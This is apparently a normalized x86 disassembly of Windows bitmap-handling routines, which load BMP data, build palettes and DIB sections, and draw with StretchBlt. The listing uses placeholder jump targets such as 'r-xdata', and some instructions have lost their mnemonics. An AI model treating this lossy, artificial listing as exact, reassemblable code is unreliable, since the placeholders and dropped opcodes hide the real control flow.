mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_426178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4259b8
mov eax [ ebp - 0x8 ]
call sub_41f6dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a9c
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4259e4
push ebx
mov ebx eax
mov eax ebx
call sub_425cd8
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d18c
pop ebx
retn
sub_425a14
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41936c
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_425f08
lea eax [ ebx + 0x2c ]
call sub_40d18c
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_426178
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_425a88
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_421540
mov eax ebx
call sub_426018
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_425e14
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_425cc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_42146c
push eax
call SetStretchBltMode
mov eax ebx
call sub_425d58
mov dl [ r-xdata ]
call sub_421540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_425fb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_425d58
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ccb
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_425c59
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_425d58
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_421a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_425cd8
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_425f18
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_425924
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4217bc
sub_425d58
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_425f18
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4259e4
sub_425da0
push ebx
mov ebx eax
mov eax ebx
call sub_425f08
mov eax ebx
call sub_425f18
mov edx ebx
mov eax ebx
call sub_4259e4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_425dc4
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_425e44
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41ffac
mov eax ebx
call sub_425e14
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_425d58
xor edx edx
pop ecx
call sub_4213f8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_425e94
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_426018
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_424ebc
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_425f18
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_419308
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_425f9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_425fb8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_425f08
mov eax ebx
call sub_425f18
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_425e44
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_425584
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_424a78
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_426018
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_421f54
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_424a78
push 0x0
call GetDC
call sub_421864
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4260d0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_42172c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_425924
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_425f08
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402cfc
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_426154
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4192e8
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_426808
pop esi
pop ebx
retn
sub_426178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4261ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403498
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42625f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_424cec
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_424ce8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426266
push rw-data
call LeaveCriticalSection
retn
sub_426278
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_426808
pop edx
pop edi
pop esi
pop ebx
retn
sub_4262a0
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_40276c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_4267bd
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_426790
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cfc
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_421744
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_419584
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402cfc
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_419514
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_4219d4
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4219f4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_419514
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_421864
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42670b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_421c9c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_40276c
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_426673
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_419514
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_421864
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_426647
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_421f54
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cc30
call sub_421744
jmp r-xdata
xor eax eax
push ebp
push sub_4266da
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_419514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42664e
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426712
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cc30
call sub_421744
jmp r-xdata
sub_42664e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40278c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_426712
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402cfc
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4267a7
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_421f54
mov [ ebp - 0x30 ] eax
sub_4267c4
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_426178
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_426808
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_425f08
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_419514
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402cfc
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_426178
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4262a0
call sub_421744
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_426878
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_425f08
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cfc
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_425520
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_426913
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_426178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42693c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_425dc4
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_425f08
mov eax esi
call sub_426018
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_425f08
mov eax esi
call sub_426018
mov eax esi
call sub_425e94
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_425520
mov ebp eax
